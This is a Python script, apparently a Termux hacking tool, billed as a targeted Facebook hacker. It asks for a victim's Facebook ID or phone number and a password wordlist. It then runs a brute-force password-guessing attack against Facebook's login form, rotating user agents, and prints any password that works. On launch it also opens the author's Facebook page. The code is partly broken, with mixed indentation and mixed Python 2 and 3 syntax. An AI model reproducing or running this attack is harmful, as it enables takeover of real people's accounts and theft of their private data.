#coding by Xbal Meonk
#jangan Recode gan..
import sys
import os
def hora():
       os.system('date +%r')
os.system("termux-open-url https://fb.me/DeadLikado01")
autor = "\033[95mAUTOR :\033[0m Deadlikado"
version = "\033[95mVERSIÓN :\033[0m 3.1.2 "
def limpiar():
   os.system('clear')
def menu():
      print("""\033[0;36m
 \t ___    ___   ___     ___
 \t \  \  /  /  |   \   /   |  HACK
 \t  \  \/  /   |    \_/    |   FACEBOOK
 \t  /  /\  \   |  |\___/|  |     BERTARGET
 \t /  /  \  \  |  |     |  |
 \t 
 \t\033[97m                      
    *****    *****     ****   ****   **********   ****    ****
    *****    *****    ****    ****  ****     ***  ****  ****
    **************   ****     ****  ****          *********
    **************  **************  ****          **********
    *****    *****  **************  ****     ***  ****   ****
    *****    *****            ****   *********    ****    ****
""")
limpiar()
print(autor)
print(version)
menu()
hora()

#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random

email = str(raw_input(" \nNo.id atau No.Hp ====}>  " ))

passwordslist = str(raw_input(" \nPasswords  ====}> : "))

#login
login = 'https://www.facebook.com/login.php?login_attempt=1'
#agente
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        iniciar()
        contra()
        hora()
        print "  BERHASIL MERETAS"
        print " KATA SANDI "

def brute(password):
        sys.stdout.write("\r[+]\033[97;1m Hack..... {}\n".format(password))
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()
     	if log != login and (not 'login_attempt' in log):
                print("--- La Contraseña Es : {}".format(password))
                yo = raw_input("Contraseña Encontrada!!.")
                if yo == 'y':
                    exit()
                elif yo == 'n':
                       exit()


def contra():
        global password
        passwords = open(passwordslist,"r")
        for password in passwords:
                passwords = password.replace("\n","")
                brute(password)
def iniciar():
        total = open(passwordslist,"r")
        total = total.readlines()
        hora()
        print("\nID VÍCTIMA :\033[90m {}".format(email))
        print " \n\033[0m[___] berhasil membuka facebook"
if __name__ == '__main__':
        main()
